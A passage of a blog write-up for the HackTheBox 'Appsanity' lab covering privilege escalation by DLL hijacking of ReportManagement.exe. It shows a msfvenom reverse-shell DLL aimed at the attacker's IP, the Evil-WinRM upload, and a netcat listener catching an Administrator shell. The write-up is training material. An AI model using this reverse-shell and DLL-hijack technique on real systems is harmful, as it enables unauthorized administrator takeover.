+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:\Program Files\ReportManagement
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">d-----         11/3/2023   5:51 PM                Libraries
+</span></span><span class="line"><span class="cl">-a----          5/5/2023   5:21 AM          34152 cryptbase.dll
+</span></span><span class="line"><span class="cl">-a----          5/5/2023   5:21 AM          83744 cryptsp.dll
+</span></span><span class="line"><span class="cl">-a----         3/11/2021   9:22 AM         564112 msvcp140.dll
+</span></span><span class="line"><span class="cl">-a----         9/17/2023   3:54 AM         140512 profapi.dll
+</span></span><span class="line"><span class="cl">-a----        10/20/2023   2:56 PM         102912 ReportManagement.exe
+</span></span><span class="line"><span class="cl">-a----        10/20/2023   1:47 PM       11492864 ReportManagementHelper.exe
+</span></span><span class="line"><span class="cl">-a----         3/11/2021   9:22 AM          96144 vcruntime140.dll
+</span></span><span class="line"><span class="cl">-a----         3/11/2021   9:22 AM          36752 vcruntime140_1.dll
+</span></span><span class="line"><span class="cl">-a----          5/5/2023   5:21 AM         179248 wldp.dll
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="analysis-of-reportmanagementexe">Analysis of ReportManagement.exe</h3>
+<h4 id="setting-up-process-monitor-in-windows">Setting up Process Monitor in Windows</h4>
+<p>We also can note that <code>Libraries</code> folder is writable by us, while the main folder is not.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Program Files\ReportManagement&gt; icacls &#39;C:\Program Files\ReportManagement\Libraries&#39;
+</span></span><span class="line"><span class="cl">C:\Program Files\ReportManagement\Libraries APPSANITY\devdoc:(OI)(CI)(RX,W)
+</span></span><span class="line"><span class="cl">                                            BUILTIN\Administrators:(I)(F)
+</span></span><span class="line"><span class="cl">                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+</span></span><span class="line"><span class="cl">                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+</span></span><span class="line"><span class="cl">                                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+</span></span><span class="line"><span class="cl">                                            BUILTIN\Users:(I)(OI)(CI)(R)
+</span></span><span class="line"><span class="cl">                                            NT SERVICE\TrustedInstaller:(I)(CI)(F)
+</span></span><span class="line"><span class="cl">                                            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(RX)
+</span></span><span class="line"><span class="cl">                                            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(RX)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Successfully processed 1 files; Failed processing 0 files
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>APPSANITY\devdoc:(OI)(CI)(RX,W)</code> gives us read, execute, and write permissions for this folder. However, we might not think dll hijacking is possible due to the main folder containing all the .dll&rsquo;s that we see, and Libraries is empty. To get a better understanding of what this program is doing, I transferred all files in the folders to a Windows VM, where I can monitor activities using Process Monitor.</p>
+<p>For filterings, we can filter by Process Name, containing &ldquo;ReportManagement.&rdquo;</p>
+<p><img src="/post/hackthebox-appsanity/Images/procmonfilter.png"
+	width="618"
+	height="478"
+	srcset="/post/hackthebox-appsanity/Images/procmonfilter_hu2039027e725cc567a1e5b9344a52c2c0_39554_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/procmonfilter_hu2039027e725cc567a1e5b9344a52c2c0_39554_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="129"
+		data-flex-basis="310px"
+	
+></p>
+<p>Now we can run the ReportManagement.exe, to avoid permission conflicts I simply run as administrator. This might not be a good idea if you don&rsquo;t use a virtual machine.</p>
+<p>Now, to connect to the open port 100, I used nc.exe:</p>
+<p><img src="/post/hackthebox-appsanity/Images/powershellnc.png"
+	width="595"
+	height="112"
+	srcset="/post/hackthebox-appsanity/Images/powershellnc_hu5aaaf128e241af922baf1ee1ae64dad3_9137_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/powershellnc_hu5aaaf128e241af922baf1ee1ae64dad3_9137_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="531"
+		data-flex-basis="1275px"
+	
+></p>
+<h4 id="using-process-monitor-to-track-each-command">Using Process Monitor to track each command</h4>
+<p>By watching the process monitor, we can see what actions are being taken on each command. For instance, <code>recover</code> seems to be looking in the folder <code>C:\Users\Administrator\Backup</code>. Additionally, it looks like we can perform directory traversal. However, I wasn&rsquo;t able to get this type of attack working well.</p>
+<p><img src="/post/hackthebox-appsanity/Images/dirtrav1.png"
+	width="868"
+	height="60"
+	srcset="/post/hackthebox-appsanity/Images/dirtrav1_hu6bbac5b55acdcabd4862e314cd22ee1a_14990_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/dirtrav1_hu6bbac5b55acdcabd4862e314cd22ee1a_14990_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1446"
+		data-flex-basis="3472px"
+	
+></p>
+<p>When looking at <code>upload</code>, we can see the service accessing files in <code>Libraries</code>. Out of all commands, this appears to be the only one doing something with Libraries, the folder we have write permissions over.</p>
+<p><img src="/post/hackthebox-appsanity/Images/upload1.png"
+	width="830"
+	height="74"
+	srcset="/post/hackthebox-appsanity/Images/upload1_hue5be1559ac4a78efb7238988a02bd145_15430_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/upload1_hue5be1559ac4a78efb7238988a02bd145_15430_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1121"
+		data-flex-basis="2691px"
+	
+></p>
+<p>When we cat the file contents of the executable, we can see some interesting stuff related to upload as well:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">Invalid</span> <span class="n">command</span><span class="o">.</span> <span class="n">Missing</span> <span class="n">parameter</span> <span class="n">after</span> <span class="s1">&#39;upload&#39;</span><span class="o">.</span> <span class="n">Type</span> <span class="s1">&#39;help&#39;</span> <span class="k">for</span> <span class="n">available</span> <span class="n">commands</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="n">sC</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">ReportManagement</span>\<span class="n">Libraries</span><span class="o">.</span><span class="n">dllexternaluploadFailed</span> <span class="n">to</span> <span class="n">upload</span> <span class="n">to</span> <span class="n">external</span> <span class="n">source</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">c</span> <span class="n">ReportManagementHelper</span> <span class="n">Libraries</span>\<span class="n">c</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">System32</span>\<span class="n">cmd</span><span class="o">.</span><span class="n">exeAttempting</span> <span class="n">to</span> <span class="n">upload</span> <span class="n">to</span> <span class="n">external</span> <span class="n">source</span><span class="o">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This can be more clear in a text editor like vim:</p>
+<p><img src="/post/hackthebox-appsanity/Images/externalupload.png"
+	width="652"
+	height="66"
+	srcset="/post/hackthebox-appsanity/Images/externalupload_hue0692ae2fcb7af190119e87d1a119a2f_9048_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/externalupload_hue0692ae2fcb7af190119e87d1a119a2f_9048_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="987"
+		data-flex-basis="2370px"
+	
+></p>
+<p>The file it is searching for is <code>externalupload.dll</code>.
+We can add a dummy externalupload.dll and see how the program behaves in ProcMon:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Flare</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">echo</span> <span class="s1">&#39;test&#39;</span> <span class="o">&gt;</span> <span class="s1">&#39;C:\Program Files\ReportManagement\Libraries\externalupload.dll&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/post/hackthebox-appsanity/Images/powershellnc2.png"
+	width="752"
+	height="121"
+	srcset="/post/hackthebox-appsanity/Images/powershellnc2_hu64a46ebcdcc59836f4361b009a060b45_18062_480x0_resize_box_3.png 480w, /post/hackthebox-appsanity/Images/powershellnc2_hu64a46ebcdcc59836f4361b009a060b45_18062_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="621"
+		data-flex-basis="1491px"
+	
+></p>
+<h3 id="abusing-remotemanagement-via-dll-hijacking">Abusing RemoteManagement via DLL hijacking</h3>
+<p>When we attempt upload again, we see a new message of <code>Attempting to upload</code>, and <code>cmd.exe</code> is also spawned as well. I thought we would see <code>externalupload.dll</code> would be accessed, but maybe we cannot see it while filtering for ReportManager as the process name. Regardless, we know that adding <code>externalupload.dll</code> causes additional behaviors that we might abuse.</p>
+<p>We can generate a reverse shell payload with <code>msfvenom</code>, and deliver it to the Libraries folder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Appsanity</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">powershell_reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.134</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">8080</span> <span class="o">-</span><span class="n">f</span> <span class="n">dll</span> <span class="o">-</span><span class="n">o</span> <span class="n">externalupload</span><span class="o">.</span><span class="n">dll</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">No</span> <span class="n">platform</span> <span class="n">was</span> <span class="n">selected</span><span class="p">,</span> <span class="n">choosing</span> <span class="n">Msf</span><span class="p">::</span><span class="n">Module</span><span class="p">::</span><span class="n">Platform</span><span class="p">::</span><span class="n">Windows</span> <span class="n">from</span> <span class="n">the</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">No</span> <span class="n">arch</span> <span class="n">selected</span><span class="p">,</span> <span class="n">selecting</span> <span class="n">arch</span><span class="p">:</span> <span class="n">x64</span> <span class="n">from</span> <span class="n">the</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">No</span> <span class="n">encoder</span> <span class="n">specified</span><span class="p">,</span> <span class="n">outputting</span> <span class="n">raw</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="n">size</span><span class="p">:</span> <span class="mi">1879</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">Final</span> <span class="n">size</span> <span class="n">of</span> <span class="n">dll</span> <span class="n">file</span><span class="p">:</span> <span class="mi">9216</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">Saved</span> <span class="n">as</span><span class="p">:</span> <span class="n">externalupload</span><span class="o">.</span><span class="n">dll</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Uploading the file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">ReportManagement</span>\<span class="n">Libraries</span><span class="o">&gt;</span> <span class="n">upload</span> <span class="n">externalupload</span><span class="o">.</span><span class="n">dll</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Info</span><span class="p">:</span> <span class="n">Uploading</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Appsanity</span><span class="o">/</span><span class="n">externalupload</span><span class="o">.</span><span class="n">dll</span> <span class="n">to</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">Files</span>\<span class="n">ReportManagement</span>\<span class="n">Libraries</span>\<span class="n">externalupload</span><span class="o">.</span><span class="n">dll</span>                                                                                               
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Data</span><span class="p">:</span> <span class="mi">12288</span> <span class="n">bytes</span> <span class="n">of</span> <span class="mi">12288</span> <span class="n">bytes</span> <span class="n">copied</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Info</span><span class="p">:</span> <span class="n">Upload</span> <span class="n">successful</span><span class="o">!</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lastly, attempting to call upload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Appsanity</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">nc</span> <span class="n">localhost</span> <span class="mi">100</span>
+</span></span><span class="line"><span class="cl"><span class="n">Reports</span> <span class="n">Management</span> <span class="n">administrative</span> <span class="n">console</span><span class="o">.</span> <span class="n">Type</span> <span class="s2">&#34;help&#34;</span> <span class="n">to</span> <span class="n">view</span> <span class="n">available</span> <span class="n">commands</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">asdf</span>
+</span></span><span class="line"><span class="cl"><span class="n">Attempting</span> <span class="n">to</span> <span class="n">upload</span> <span class="n">to</span> <span class="n">external</span> <span class="n">source</span><span class="o">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Meanwhile on my listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Appsanity]
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp 8080
+</span></span><span class="line"><span class="cl">listening on [any] 8080 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.194] from (UNKNOWN) [10.10.11.238] 61785
+</span></span><span class="line"><span class="cl">Windows PowerShell running as user Administrator on APPSANITY
+</span></span><span class="line"><span class="cl">Copyright (C) Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">appsanity\administrator
+</span></span><span class="line"><span class="cl">PS C:\Program Files\ReportManagement&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally, we have access as Administrator!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/cookie/">Cookie</a>
+        
+            <a href="/tags/magic-byte/">Magic Byte</a>
+        
+            <a href="/tags/upload-bypass/">Upload Bypass</a>
+        
+            <a href="/tags/ssrf/">SSRF</a>
+        
+            <a href="/tags/lfi/">LFI</a>
+        
+            <a href="/tags/dll-analysis/">DLL Analysis</a>
+        
+            <a href="/tags/dnspy/">DnSpy</a>
+        
+            <a href="/tags/exe-analysis/">Exe Analysis</a>
+        
+            <a href="/tags/procmon/">ProcMon</a>
+        
+            <a href="/tags/dll-hijack/">DLL Hijack</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-sau/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-sau/Sau.e47c82080c294ed27892e64446e0941f_hu395bd5edbfd24d434ffdbc0f1375eb9f_446175_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Sau"
+                        
+                        data-hash="md5-5HyCCAwpTtJ4kuZERuCUHw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Sau</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-format/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-format/Format.910e024119b03811cd8466e187bde5fe_hucfdd9eb173c0886a8604431711aec1ea_316610_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Format"
+                        
+                        data-hash="md5-kQ4CQRmwOBHNhGbhh73l/g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Format</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-inject/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-inject/Inject.9f9716c1200516310e6e4cd98e20c139_hu12ac3957f7a126ac06ec9338f7d84355_333068_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Inject"
+                        
+                        data-hash="md5-n5cWwSAFFjEObkzZjiDBOQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Inject</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-cozyhosting/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-cozyhosting/CozyHosting.5c10fb7439d426645511c0790ed3ccb2_hu57b040a445aedb3fdc2bc656dc9a4afd_278920_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - CozyHosting"
+                        
+                        data-hash="md5-XBD7dDnUJmRVEcB5DtPMsg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - CozyHosting</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-visual/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-visual/Visual.161f7ee3284e2802b170218feede8443_hu2821e9da4ab5851c83163c70bbdf7481_348069_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Visual"
+                        
+                        data-hash="md5-Fh9&#43;4yhOKAKxcCGP7t6EQw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Visual</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2023 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#enumerating-account-registration">Enumerating account registration</a></li>
+        <li><a href="#discovery-of-portal-subdomain">Discovery of portal subdomain</a></li>
+        <li><a href="#examining-authenitcation-token">Examining authenitcation token</a></li>
+        <li><a href="#editing-hidden-variable-in-registration">Editing hidden variable in registration</a></li>
+        <li><a href="#accessing-portal-subdomain-through-cookie-re-use">Accessing portal subdomain through cookie re-use</a></li>
+        <li><a href="#file-upload-potential-in-portal-subdomain">File upload potential in portal subdomain</a></li>
+        <li><a href="#remote-connection-possible-in-prescription-link-submission">Remote connection possible in Prescription Link submission</a></li>
+        <li><a href="#ssrf-potential-in-prescription-link">SSRF potential in Prescription Link</a></li>
+        <li><a href="#fuzzing-internal-ports-via-ssrf">Fuzzing internal ports via SSRF</a></li>
+      </ol>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#remote-shell-access-via-ssrf--lfi-vulnerabilities">Remote Shell access via SSRF + LFI vulnerabilities</a></li>
+      </ol>
+    </li>
+    <li><a href="#lateral-movement">Lateral Movement</a>
+      <ol>
+        <li><a href="#enumerating-the-examinationpanel">Enumerating the ExaminationPanel</a></li>
+        <li><a href="#analyzing-examinationmanagementdll">Analyzing ExaminationManagement.dll</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#discovery-of-reports-management-console">Discovery of Reports Management Console</a></li>
+        <li><a href="#analysis-of-reportmanagementexe">Analysis of ReportManagement.exe</a>
+          <ol>
+            <li><a href="#setting-up-process-monitor-in-windows">Setting up Process Monitor in Windows</a></li>
+            <li><a href="#using-process-monitor-to-track-each-command">Using Process Monitor to track each command</a></li>
+          </ol>
+        </li>
+        <li><a href="#abusing-remotemanagement-via-dll-hijacking">Abusing RemoteManagement via DLL hijacking</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+
+    </body>
+</html>
